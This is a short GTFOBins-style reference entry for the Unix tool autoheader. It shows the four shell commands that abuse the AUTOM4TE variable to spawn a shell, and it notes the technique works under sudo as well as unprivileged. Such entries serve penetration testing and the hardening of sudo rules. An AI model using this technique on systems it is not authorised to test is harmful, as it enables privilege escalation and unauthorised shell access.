---
type: gtfobin
name: autoheader
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# autoheader

## shell

```bash
echo '/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
touch configure.ac
AUTOM4TE=/path/to/temp-file autoheader
```
**Contexts:** sudo, unprivileged
